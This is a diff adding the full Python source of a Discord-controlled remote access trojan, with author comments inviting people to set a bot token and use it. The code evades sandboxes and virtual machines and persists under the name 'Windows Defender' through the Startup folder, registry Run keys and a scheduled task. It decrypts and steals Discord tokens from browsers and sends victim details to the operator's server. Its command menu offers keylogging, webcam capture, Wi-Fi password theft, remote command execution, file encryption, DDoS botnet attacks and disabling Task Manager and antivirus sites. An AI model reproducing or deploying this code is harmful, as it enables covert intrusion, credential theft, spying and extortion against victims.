@@ -1,0 +1,2287 @@
+import asyncio
+import ctypes
+import cv2
+import discord
+import math
+import os
+import platform
+import psutil
+import pyautogui
+import pyperclip
+import random
+import requests
+import shutil
+import socket
+import subprocess
+import sys
+import threading
+import time
+import json
+import re
+import base64
+import pyaes
+import tkinter as tk
+import winreg as reg
+import glob
+from pynput import keyboard
+from urllib3 import PoolManager, HTTPResponse
+from ctypes import *
+from concurrent.futures import ThreadPoolExecutor
+from colorama import Fore, init
+from discord.ext import commands
+from PIL import Image, ImageTk
+from win32crypt import CryptUnprotectData
+
+os.system("@echo off")
+os.system("cls")
+init()
+print(Fore.GREEN)
+if sys.platform.startswith('win'):
+    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+def perform_all_checks():
+    blacklisted_names = ["johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus", "john doe", "test user", "sand box", "wdagutilityaccount"]
+    current_username = os.getenv("USERNAME", "").lower()
+    if current_username in blacklisted_names:
+        return "Blacklisted username detected"
+
+    qemu_drivers = ["qemu-ga", "qemuwmi"]
+    sys32 = os.path.join(os.getenv("SystemRoot", ""), "System32")
+    try:
+        detected_drivers = []
+        files = os.listdir(sys32)
+        for file in files:
+            for driver in qemu_drivers:
+                if driver in file.lower():
+                    detected_drivers.append(driver)
+        if detected_drivers:
+            exit()
+            return f"QEMU drivers detected: {', '.join(detected_drivers)}"
+    except Exception as e:
+        return f"Error accessing System32 directory for QEMU: {e}"
+
+    try:
+        result = subprocess.check_output(['wmic', 'diskdrive', 'get', 'model'], text=True)
+        if "DADY HARDDISK" in result or "QEMU HARDDISK" in result:
+            exit()
+            return "QEMU virtual disk detected"
+    except subprocess.CalledProcessError as e:
+        return f"Error running wmic command for disk check: {e}"
+
+    try:
+        cmd = subprocess.Popen(['wmic', 'path', 'win32_VideoController', 'get', 'name'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        gpu_output, err = cmd.communicate()
+
+        if err:
+            return f"Error executing command for graphics card: {err.decode('utf-8').strip()}"
+        
+        if b"vmware" in gpu_output.lower():
+            exit()
+            return "VMware graphics card detected"
+        elif b"virtualbox" in gpu_output.lower():
+            exit()
+            return "VirtualBox graphics card detected"
+    except Exception as e:
+        return f"Error in GraphicsCardCheck: {e}"
+
+    try:
+        recdir = os.path.join(os.getenv('APPDATA'), 'microsoft', 'windows', 'recent')
+        files = os.listdir(recdir)
+        if len(files) < 20:
+            exit()
+            return "Recent file activity check passed"
+    except Exception as e:
+        return f"Error reading recent file activity directory: {e}"
+
+    parallels_drivers = ["prl_sf", "prl_tg", "prl_eth"]
+    try:
+        files = os.listdir(sys32)
+        for file in files:
+            for driver in parallels_drivers:
+                if driver in file.lower():
+                    exit()
+                    return "Parallels drivers detected"
+    except Exception as e:
+        return f"Error accessing System32 directory for Parallels: {e}"
+
+    bad_drivers_list = ["balloon.sys", "netkvm.sys", "vioinput*", "viofs.sys", "vioser.sys"]
+    for driver in bad_drivers_list:
+        files = glob.glob(os.path.join(sys32, driver))
+        if files:
+            exit()
+            return "KVM drivers detected"
+
+    return "No VM found!"
+
+result = perform_all_checks()
+print(result)
+executor = ThreadPoolExecutor()
+intents = discord.Intents.default()
+intents.messages = True
+intents.guilds = True
+intents.message_content = True
+
+# This RAT is made by H-zz-H!  
+# If you have any questions or need help, feel free to contact me on Discord: _h_zz_h_ or join my server: https://discord.gg/29Ya4F3CgQ.  
+# On my Discord server (as of 23.02.2025), I have posted a cracked open-source Discord Stealer that would normally cost more than 120 euros for lifetime access.  
+# Join my Discord server for coding help or if you encounter errors with this RAT. I am always open to new ideas, projects, or feature suggestions for this RAT.  
+# If you want to add new features or improve this RAT, feel free to do so and share your work with me on Discord.  
+# If I find the time, this RAT will be updated and working forever. If not, well, I don't know.  
+# If you use this RAT for illegal purposes, I am not responsible for it. I am also not responsible for any damage caused by this RAT.  
+# Skid from this project if you want, I don’t really care lol. Just don’t claim it as your own work.  
+
+# Sources I skidded from:  
+# https://github.com/Blank-c/Blank-Grabber (The !blocklist and !unblocklist commands are almost fully skidded. I just changed the code a bit to fit my project).  
+# Tried doing it on my own (but I’m way too retarded for that).
+# https://github.com/moom825/Discord-RAT (Because of this RAT, I started this project. So special thanks to moom825).  
+# The !uncritproc and !critproc commands are from moom825's Discord-RAT project. Many features are quite the same as in moom825's project.  
+# That’s because I needed some features I could code, and his GitHub page was full of ideas to implement.  
+# Almost everything in this project is inspired by him.  
+
+# Thanks for taking the time to read.  
+# On line 146, change the Discord bot token to yours, and you’re good to go!  
+# Love y’all. Bye.  
+# ~~~ H-zz-H ~~~  
+
+HzzH = "your bot token here" # Put ur bot token here
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None) # Change the "!" to whatever prefix you want
+
+# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
+
+# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
+
+# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
+
+# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
+
+# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
+
+script_path = os.path.realpath(sys.argv[0])
+autohzzh = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+hzzh_path = os.path.join(autohzzh, 'Windows Defender.exe')
+temp_folder = os.getenv('TEMP')
+file_name = "Windows Defender.exe"
+hzzh_path1 = os.path.join(temp_folder, file_name)
+log_file_path = os.path.join(temp_folder, "hzzh.txt")
+keylog_listener = None
+key_log = []
+ACTIVE_PCS_FILE = os.path.join(os.environ['TEMP'], "active_pcs.txt")
+FLOATING_WINDOW = None
+SAVE_PATH = os.environ['TEMP']
+httpClient = PoolManager(cert_reqs="CERT_NONE")
+ROAMING = os.getenv("appdata")
+LOCALAPPDATA = os.getenv("localappdata")
+REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
+REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
+temp_folder = os.environ['TEMP'] 
+current_directory = os.getcwd()
+
+if not os.path.exists(ACTIVE_PCS_FILE):
+    with open(ACTIVE_PCS_FILE, "w") as f:
+        pass
+
+def get_active_pcs():
+    with open(ACTIVE_PCS_FILE, "r") as f:
+        return set(line.strip() for line in f.readlines())
+active_pcs = get_active_pcs()
+def add_active_pc(pc_name):
+    with open(ACTIVE_PCS_FILE, "a") as f:
+        f.write(f"{pc_name}\n")
+
+def remove_active_pc(pc_name):
+    active_pcs = get_active_pcs()
+    active_pcs.discard(pc_name)
+    with open(ACTIVE_PCS_FILE, "w") as f:
+        for pc in active_pcs:
+            f.write(f"{pc}\n")
+
+def get_system_info():
+    try:
+        pc_name = platform.node()
+        ip_address = socket.gethostbyname(socket.gethostname())
+        system_version = platform.platform()
+        cpu_usage = psutil.cpu_percent(interval=1)
+        memory = psutil.virtual_memory().percent
+        disk = psutil.disk_usage('/')
+        disk_free = round(disk.free / (1024 ** 3), 2)
+        disk_total = round(disk.total / (1024 ** 3), 2)
+        disk_used = round(disk.used / (1024 ** 3), 2)
+        ram = psutil.virtual_memory().used / (1024 ** 3) 
+        total_ram = psutil.virtual_memory().total / (1024 ** 3) 
+        geolocation_info = get_geolocation_info(ip_address)
+
+        return {
+            "PC Name": pc_name,
+            "IP Address": ip_address,
+            "System Version": system_version,
+            "CPU Usage": f"{cpu_usage}%",
+            "Memory Usage": f"{memory}%",
+            "Disk Usage": f"{disk_used:.2f} GB used / {disk_free:.2f} GB free / {disk_total:.2f} GB total",
+            "Geolocation": geolocation_info,
+            "RAM Usage": f"{ram:.2f} GB / {total_ram:.2f} GB",
+            "Disk Info": f"{disk_used} GB from {disk.total / (1024 ** 3):.2f} GB used",
+        }
+    except Exception as e:
+        return {"Error": str(e)}
+
+def get_geolocation_info(ip_address):
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        data = response.json()
+        city = data.get("city", "Unknown")
+        region = data.get("region", "Unknown")
+        country = data.get("country", "Unknown")
+        return f"{city}, {region}, {country}"
+    except:
+        return "Unavailable"
+
+def get_battery_status():
+    try:
+        battery = psutil.sensors_battery()
+        if battery:
+            return f"{battery.percent}% remaining (plugged in: {battery.power_plugged})"
+        else:
+            return "No battery found"
+    except:
+        return "Error retrieving battery info"
+
+def get_running_tasks():
+    try:
+        tasks = []
+        for proc in psutil.process_iter(['pid', 'name']):
+            tasks.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
+        return tasks if tasks else ["No tasks running."]
+    except Exception as e:
+        return [f"Error fetching tasks: {e}"]
+
+def change_wallpaper_windows(image_path):
+    try:
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+    except Exception as e:
+        ""
+
+def is_admin():
+    return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    
+def ask_for_admin():
+    if is_admin():
+        return True
+    return False
+
+def trigger_uac():
+    if not is_admin():
+        exe_path = sys.argv[0]
+
+        arguments = " ".join(sys.argv[1:])
+
+        if exe_path.endswith(".py"):
+            python_exe = sys.executable
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", python_exe, f'"{exe_path}" {arguments}', None, 1
+            )
+        else:
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", exe_path, arguments, None, 1
+            )
+
+        if result <= 32:
+            return False
+        else:
+            return True
+    else:
+        return True
+    
+def hzzh():
+    try:
+        if not os.path.exists(hzzh_path):
+            shutil.copy(script_path, hzzh_path)
+    except:
+        pass
+def hzzhtemp():
+    try:
+        shutil.copy(script_path, hzzh_path1)
+    except:
+        pass
+def hzzhreg():
+    try:
+        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
+        reg.SetValueEx(registry_key, "Windows Defender", 0, reg.REG_SZ, hzzh_path)
+        reg.CloseKey(registry_key)
+    except Exception as e:
+        pass
+def hzzh_runonce():
+    try:
+        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 0, reg.KEY_WRITE)
+        reg.SetValueEx(registry_key, "Windows Defender", 0, reg.REG_SZ, hzzh_path1)
+        reg.CloseKey(registry_key)
+    except Exception as e:
+        pass
+def hzzh_task_scheduler():
+    try:
+        task_name = "WindowsDefenderTask"
+        command = f'schtasks /create /tn "{task_name}" /tr "{hzzh_path}" /sc onlogon /rl highest'
+        subprocess.run(command, shell=True)
+    except Exception as e:
+        pass
+
+def prevent_close():
+    pass
+
+def smooth_move_window(root, start_x, start_y, end_x, end_y, steps=20):
+    delta_x = (end_x - start_x) / steps
+    delta_y = (end_y - start_y) / steps
+    for i in range(steps):
+        new_x = int(start_x + delta_x * (i + 1))
+        new_y = int(start_y + delta_y * (i + 1))
+        root.geometry(f"{new_x}x{new_y}")
+        root.update()
+        time.sleep(0.01)
+
+def move_window_randomly(root):
+    if random.choice([True, False]):
+        screen_width = root.winfo_screenwidth()
+        screen_height = root.winfo_screenheight()
+
+        current_geometry = root.geometry()
+        current_x = int(current_geometry.split('+')[1])
+        current_y = int(current_geometry.split('+')[2])
+
+        new_x = random.randint(0, screen_width - root.winfo_width())
+        new_y = random.randint(0, screen_height - root.winfo_height())
+
+        smooth_move_window(root, current_x, current_y, new_x, new_y)
+    
+    root.after(random.randint(500, 2000), move_window_randomly, root)
+
+def download_image(image_url):
+    if not os.path.exists(SAVE_PATH):
+        os.makedirs(SAVE_PATH)
+
+    response = requests.get(image_url, stream=True)
+    if response.status_code != 200:
+        raise Exception(f"Failed to download image: {response.status_code}")
+
+    file_extension = image_url.split(".")[-1].split("?")[0].lower()
+    valid_extensions = ["jpg", "jpeg", "png", "bmp", "gif", "webp"]
+    
+    if file_extension not in valid_extensions:
+        file_extension = "png"
+
+    file_path = os.path.join(SAVE_PATH, f"floating_image.{file_extension}")
+
+    with open(file_path, 'wb') as file:
+        for chunk in response.iter_content(1024):
+            file.write(chunk)
+
+    try:
+        with Image.open(file_path) as img:
+            img.verify() 
+    except Exception as e:
+        os.remove(file_path) 
+        raise Exception(f"Downloaded file is not a valid image: {e}")
+
+    if file_extension == "webp":
+        converted_path = os.path.join(SAVE_PATH, "floating_image.png")
+        try:
+            with Image.open(file_path) as img:
+                img.convert("RGBA").save(converted_path, "PNG")
+            file_path = converted_path 
+        except Exception as e:
+            raise Exception(f"Error converting WebP: {e}")
+
+    return file_path
+
+def create_window(duration, file_path):
+    global FLOATING_WINDOW
+    FLOATING_WINDOW = tk.Tk()
+    FLOATING_WINDOW.title("Floating Image")
+    FLOATING_WINDOW.resizable(False, False)
+    FLOATING_WINDOW.overrideredirect(True)
+    FLOATING_WINDOW.attributes('-topmost', 1)
+
+    try:
+        image = Image.open(file_path).convert("RGBA")  
+    except Exception as e:
+        ""
+        return
+    
+    width, height = image.size  
+    FLOATING_WINDOW.geometry(f"{width}x{height}") 
+
+    photo = ImageTk.PhotoImage(image)
+    label = tk.Label(FLOATING_WINDOW, image=photo)
+    label.image = photo
+    label.pack()
+
+    FLOATING_WINDOW.protocol("WM_DELETE_WINDOW", prevent_close)
+    move_window_randomly(FLOATING_WINDOW)
+    
+    threading.Timer(duration, FLOATING_WINDOW.destroy).start()
+    FLOATING_WINDOW.mainloop()
+
+def wait_for_wifi():
+    while True:
+        try:
+            socket.create_connection(("8.8.8.8", 53), timeout=5)
+            print(Fore.GREEN + "Found Wi-Fi" + Fore.RESET)
+            return
+        except (socket.timeout, socket.error):
+            print(Fore.YELLOW + "Waiting for Wi-Fi" + Fore.RESET)
+            time.sleep(5)
+
+@bot.event
+async def on_ready():
+    guild = bot.guilds[0] 
+    system_info = get_system_info()
+    pc_name = system_info.get("PC Name", "Unknown-PC")
+
+    existing_channel = discord.utils.get(guild.channels, name=pc_name.lower())
+    if existing_channel:
+        print(f"Channel for {pc_name} already exists.")
+        await existing_channel.send(embed=discord.Embed(
+                title="🐀 **[H-zz-H] Old Victim**",
+                description=f"**PC Name: 🖥️** {system_info['PC Name']}\n"
+                            f"**Private IP: 🌐** {system_info['IP Address']}\n"
+                            f"**Geolocation: 📍** {system_info['Geolocation']}\n"
+                            f"**System Version: 🖱️** {system_info['System Version']}\n"
+                            f"**CPU Usage: ⚙️** {system_info['CPU Usage']}\n"
+                            f"**Memory Usage: 💾** {system_info['Memory Usage']}\n"
+                            f"**Disk Usage: 🗂️** {system_info['Disk Info']}\n\n"
+                            "Made with ❤ by H-zz-H.",
+                color=0x00ff00
+        ))
+    else:
+        try:
+            new_channel = await guild.create_text_channel(name=pc_name.lower())
+            await new_channel.send(embed=discord.Embed(
+                title="🐀 **[H-zz-H] New Victim**",
+                description=f"**PC Name: 🖥️** {system_info['PC Name']}\n"
+                            f"**IP Address: 🌐** {system_info['IP Address']}\n"
+                            f"**Geolocation: 📍** {system_info['Geolocation']}\n"
+                            f"**System Version: 🖱️** {system_info['System Version']}\n"
+                            f"**CPU Usage: ⚙️** {system_info['CPU Usage']}\n"
+                            f"**Memory Usage: 💾** {system_info['Memory Usage']}\n"
+                            f"**Disk Usage: 🗂️** {system_info['Disk Info']}\n\n"
+                            "Made with ❤ by H-zz-H.",
+                color=0x00ff00
+            ))
+            print(f"Channel '{pc_name}' created and information sent.")
+        except Exception as e:
+            print(f"Failed to create channel for {pc_name}: {e}")
+
+    if pc_name not in active_pcs:
+        add_active_pc(pc_name)
+        active_pcs.add(pc_name)
+
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return  
+    
+    pc_name = get_system_info().get("PC Name", "Unknown-PC")
+    
+    if message.channel.name.lower() != pc_name.lower() and message.channel.name.lower() != "botnet":
+        if message.content.startswith("!botnet"):
+            embed = discord.Embed(
+                title="⚡ Botnet",
+                description="⚡ The !botnet command is only available in the #botnet channel.",
+                color=0xFF0000
+            )
+            await message.channel.send(embed=embed)
+        return
+    
+    if message.channel.name.lower() == "botnet":
+        if not (message.content.startswith("!botnet") or message.content.startswith("!botnet_stop") or message.content.startswith("!help") or message.content.startswith("!recreate") or message.content.startswith("!purge")): 
+            embed = discord.Embed(
+                title="⚡ Botnet",
+                description="⚡ Please only use !botnet commands here!",
+                color=0xFFDD00
+            )
+            await message.channel.send(embed=embed)
+            return
+
+    await bot.process_commands(message)
+
+def CaptureWebcam(index: int, filePath: str) -> bool:
+    avicap32 = ctypes.windll.avicap32
+    WS_CHILD = 0x40000000
+    WM_CAP_DRIVER_CONNECT = 0x0400 + 10
+    WM_CAP_DRIVER_DISCONNECT = 0x0402
+    WM_CAP_FILE_SAVEDIB = 0x0400 + 100 + 25
+
+    hcam = avicap32.capCreateCaptureWindowW(
+        ctypes.wintypes.LPWSTR("Blank"),
+        WS_CHILD,
+        0, 0, 0, 0,
+        ctypes.windll.user32.GetDesktopWindow(), 0
+    )
+
+    result = False
+
+    if hcam:
+        if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
+            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, ctypes.wintypes.LPWSTR(filePath)):
+                result = True
+            ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
+        ctypes.windll.user32.DestroyWindow(hcam)
+
+    return result
+
+def CreateMutex(mutex: str) -> bool:
+    kernel32 = ctypes.windll.kernel32
+    mutex = kernel32.CreateMutexA(None, False, mutex)
+    return kernel32.GetLastError() != 183
+
+def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
+    class DATA_BLOB(ctypes.Structure):
+        _fields_ = [
+            ("cbData", ctypes.c_ulong),
+            ("pbData", ctypes.POINTER(ctypes.c_ubyte))
+        ]
+
+    pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
+    pDataOut = DATA_BLOB()
+    pOptionalEntropy = None
+
+    if optional_entropy is not None:
+        optional_entropy = optional_entropy.encode("utf-16")
+        pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
+
+    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
+        data = (ctypes.c_ubyte * pDataOut.cbData)()
+        ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
+        ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
+        return bytes(data)
+
+    raise ValueError("Invalid encrypted_data provided!")
+
+def HideConsole() -> None:
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def GetHeaders(token: str = None) -> dict:
+    headers = {
+        "content-type": "application/json",
+        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
+    }
+    if token:
+        headers["authorization"] = token
+    return headers
+
+def GetTokens():
+    results = []
+    tokens = []
+    paths = get_paths()
+
+    for name, path in paths.items():
+        if os.path.exists(path):
+            tokens += SafeStorageSteal(path)
+            tokens += SimpleSteal(path)
+            if "FireFox" in name:
+                tokens += FireFoxSteal(path)
+
+    return tokens
+
+def SafeStorageSteal(path: str) -> list[str]:
+    encryptedTokens = []
+    tokens = []
+    key = None
+    levelDbPaths = []
+
+    localStatePath = os.path.join(path, "Local State")
+
+    for root, dirs, _ in os.walk(path):
+        for dir in dirs:
+            if dir == "leveldb":
+                levelDbPaths.append(os.path.join(root, dir))
+
+    if os.path.isfile(localStatePath) and levelDbPaths:
+        with open(localStatePath, errors="ignore") as file:
+            jsonContent = json.load(file)
+
+        key = jsonContent['os_crypt']['encrypted_key']
+        key = base64.b64decode(key)[5:]
+
+        for levelDbPath in levelDbPaths:
+            for file in os.listdir(levelDbPath):
+                if file.endswith((".log", ".ldb")):
+                    filepath = os.path.join(levelDbPath, file)
+                    with open(filepath, errors="ignore") as file:
+                        lines = file.readlines()
+
+                    for line in lines:
+                        if line.strip():
+                            matches = re.findall(REGEX_ENC, line)
+                            for match in matches:
+                                match = match.rstrip("\\")
+                                if match not in encryptedTokens:
+                                    match = match.split("dQw4w9WgXcQ:")[1].encode()
+                                    missing_padding = 4 - (len(match) % 4)
+                                    if missing_padding:
+                                        match += b'=' * missing_padding
+                                    match = base64.b64decode(match)
+                                    encryptedTokens.append(match)
+
+    for token in encryptedTokens:
+        try:
+            token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
+            if token:
+                tokens.append(token)
+        except Exception:
+            pass
+
+    return tokens
+
+def SimpleSteal(path: str) -> list[str]:
+    tokens = []
+    levelDbPaths = []
+
+    for root, dirs, _ in os.walk(path):
+        for dir in dirs:
+            if dir == "leveldb":
+                levelDbPaths.append(os.path.join(root, dir))
+
+    for levelDbPath in levelDbPaths:
+        for file in os.listdir(levelDbPath):
+            if file.endswith((".log", ".ldb")):
+                filepath = os.path.join(levelDbPath, file)
+                with open(filepath, errors="ignore") as file:
+                    lines = file.readlines()
+
+                for line in lines:
+                    if line.strip():
+                        matches = re.findall(REGEX, line.strip())
+                        for match in matches:
+                            match = match.rstrip("\\")
+                            if not match in tokens:
+                                tokens.append(match)
+
+    return tokens
+
+def FireFoxSteal(path: str) -> list[str]:
+    tokens = []
+
+    for root, _, files in os.walk(path):
+        for file in files:
+            if file.lower().endswith(".sqlite"):
+                filepath = os.path.join(root, file)
+                with open(filepath, errors="ignore") as file:
+                    lines = file.readlines()
+
+                    for line in lines:
+                        if line.strip():
+                            matches = re.findall(REGEX, line)
+                            for match in matches:
+                                match = match.rstrip("\\")
+                                if not match in tokens:
+                                    tokens.append(match)
+
+    return tokens
+
+def get_paths():
+    return {
+        "Discord": os.path.join(ROAMING, "discord"),
+        "Discord Canary": os.path.join(ROAMING, "discordcanary"),
+        "Lightcord": os.path.join(ROAMING, "Lightcord"),
+        "Discord PTB": os.path.join(ROAMING, "discordptb"),
+        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
+        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
+        "Amigo": os.path.join(LOCALAPPDATA, "Amigo", "User Data"),
+        "Torch": os.path.join(LOCALAPPDATA, "Torch", "User Data"),
+        "Kometa": os.path.join(LOCALAPPDATA, "Kometa", "User Data"),
+        "Orbitum": os.path.join(LOCALAPPDATA, "Orbitum", "User Data"),
+        "CentBrowse": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"),
+        "7Sta": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"),
+        "Sputnik": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
+        "Vivaldi": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"),
+        "Chrome SxS": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
+        "Chrome": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
+        "FireFox": os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles"),
+        "Epic Privacy Browse": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
+        "Microsoft Edge": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
+        "Uran": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
+        "Yandex": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
+        "Brave": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")
+    }
+
+async def tokenoutput(ctx):
+    tokens = GetTokens()
+    
+    if tokens:
+        unique_tokens = set()
+        for token in tokens:
+            if token not in unique_tokens:
+                unique_tokens.add(token)
+        
+        embed = discord.Embed(
+            title="Token List 🎁",
+            description="Here are all logged Discord tokens:",
+            color=discord.Color.green()
+        )
+        
+        for token in unique_tokens:
+            embed.add_field(name="Token", value=token, inline=False)
+        
+        return embed
+    else:
+        embed = discord.Embed(
+            title="No Tokens Found",
+            description="Could not find any tokens.",
+            color=discord.Color.red()
+        )
+        
+        return embed
+
+@bot.command()
+async def help(ctx):
+    embed = discord.Embed(
+        title="[H-zz-H] !help 📚",
+        description="Here is !help 🤖",
+        color=0x00ff00
+    )
+    embed.add_field(name="!information", value="Sends your system information 🖥️", inline=False)
+    embed.add_field(name="!disk", value="Sends used disk space 📦", inline=False)
+    embed.add_field(name="!cpu", value="Shows current CPU usage ⚙️", inline=False)
+    embed.add_field(name="!ram", value="Shows current RAM usage 💾", inline=False)
+    embed.add_field(name="!overview", value="Shows all information for CPU, RAM, and Disk 🛠️", inline=False)
+    embed.add_field(name="!network", value="Lists all WiFi networks with passwords 🌐", inline=False)
+    embed.add_field(name="!net_pass (Wifi name)", value="Outputs the password of the Wifi selected 🌐", inline=False)
+    embed.add_field(name="!publicip", value="Get Public IP of Victim 🌐", inline=False)
+    embed.add_field(name="!battery", value="Shows battery status (if laptop) 🔋", inline=False)
+    embed.add_field(name="!webcam", value="Shows webcam image 📸", inline=False)
+    embed.add_field(name="!screen", value="Takes a Screenshot 🖼️", inline=False)
+    embed.add_field(name="!tasks", value="Shows current running tasks 📝", inline=False)
+    embed.add_field(name="!web_open (url)", value="Opens a URL in the browser 🌍", inline=False)
+    embed.add_field(name="!fakecmd (amount)", value="Quick flashes (amount) CMD's 💻", inline=False)
+    embed.add_field(name="!cmdspam", value="Quickly spams CMD's until System crashes 💻", inline=False)
+    embed.add_field(name="!command (command)", value="Executes the given Command 💻", inline=False)
+    embed.add_field(name="!running", value="On how many PC's is it running rn 🌍", inline=False)
+    embed.add_field(name="!botnet (url)", value="Start a DDOS attack on a specific Server ⚡", inline=False)
+    embed.add_field(name="!botnet_stop", value="Stops the DDOS attack ⚡", inline=False)
+    embed.add_field(name="!startup", value="Puts H-zz-H in Startups using 5 different unknown Methods 🐀", inline=False)
+    embed.add_field(name="!error (Title) | (Text)", value="Displays a fake error Message ⚠️", inline=False)
+    embed.add_field(name="!shutdown", value="Shutdowns Victims PC 🛑", inline=False)
+    embed.add_field(name="!restart", value="Restarts Victims PC 🔄", inline=False)
+    embed.add_field(name="!cd (path)", value="CD into another directory 🛠️", inline=False)
+    embed.add_field(name="!list", value="Lists all files in current directory 📂", inline=False)
+    await ctx.send(embed=embed)
+
+    embed1 = discord.Embed(
+        color=0x00ff00
+    )
+    embed1.add_field(name="!download (file/path)", value="Download a file from Victims PC (10MB)📥", inline=False)
+    embed1.add_field(name="!download_ext (file.png)", value="Download a file from Victims PC (100MB)📥", inline=False)
+    embed1.add_field(name="!upload (attachment) (!path!)", value="Upload a file to Victims PC 📤", inline=False)
+    embed1.add_field(name="!admin", value="Checks for admin Permissions 🛠️", inline=False)
+    embed1.add_field(name="!wallpaper (attachment.png)", value="Change wallpaper of Victim 🖼️", inline=False)
+    embed1.add_field(name="!clipboard", value="Show Clipboard of the Victim 📋", inline=False)
+    embed1.add_field(name="!exec (path)", value="Executes a file ", inline=False)
+    embed1.add_field(name="!closesession", value="Closes if existing 2nd/3rd Sessions of the Same PC 💻", inline=False)
+    embed1.add_field(name="!keylog_start", value="Starts capturing keystrokes ⌨", inline=False)
+    embed1.add_field(name="!keylog_dump", value="Sends the recorded keystrokes (first need to stop keylogger) ⌨", inline=False)
+    embed1.add_field(name="!keylog_stop", value="Stops capturing keystrokes ⌨", inline=False)
+    embed1.add_field(name="!encrypt (*) or (file.extension)", value="Changes (all) Files in directory to .hzzh ⚽", inline=False)
+    embed1.add_field(name="!tokens", value="Get Discord Tokens 🎁", inline=False)
+    embed1.add_field(name="!getadmin", value="Gets admin Permissions by spamming UAC prompts 🛠️", inline=False)
+    embed1.add_field(name="", value="", inline=False)
+    embed1.add_field(name="", value="**Admin required Features:**", inline=False)
+    embed1.add_field(name="!taskmgr", value="Disables Task Manager 🎰", inline=False)
+    embed1.add_field(name="!taskmgr_enable", value="Enables Task Manager 🎰", inline=False)
+    embed1.add_field(name="!blocklist", value="Disables the Victim to lookup common AV Sites 🦠", inline=False)
+    embed1.add_field(name="!unblocklist", value="Enables the Victim to lookup common AV Sites 🦠", inline=False)
+    embed1.add_field(name="!nostartup", value="Disable Users permissions to look in the Startup Folder 🔒🗂️", inline=False)
+    embed1.add_field(name="!nostartup_disable", value="Enables Users permissions to look in the Startup Folder 🔓🗂️", inline=False)
+    embed1.add_field(name="!critproc", value="Makes H-zz-H a critical process. Close = Bluescreen 🆙", inline=False)
+    embed1.add_field(name="!uncritproc", value="Removes the critical process. 🆙", inline=False)
+    embed1.add_field(name="!smartup", value="Uses an Unknown StartUp path. 🐀", inline=False)
+    await ctx.send(embed=embed1)
+
+    embed2 = discord.Embed(
+        color=0x00ff00 
+    )
+    embed2.add_field(name="", value="", inline=False)
+    embed2.add_field(name="", value="**Troll Features:**", inline=False)
+    embed2.add_field(name="!floatpic (seconds) (url)", value="Creates an floating unclosable image for (seconds)", inline=False)
+    embed2.add_field(name="!screensaver", value="Shows an auto installed screensaver", inline=False)
+    embed2.add_field(name="", value="", inline=False)
+    embed2.add_field(name="", value="**Discord Features:**", inline=False)
+    embed2.add_field(name="!purge (amount)", value="Purges (amount) Chat Messages in Chat 🚮", inline=False)
+    embed2.add_field(name="!recreate (#channel)", value="Deletes and recreates a Channel 🔄", inline=False)
+    embed2.add_field(name="!net", value="Creates / Recreates the Botnet Channel ⚡", inline=False)
+    embed2.add_field(name="", value="Made with ❤ by H-zz-H.", inline=False)
+
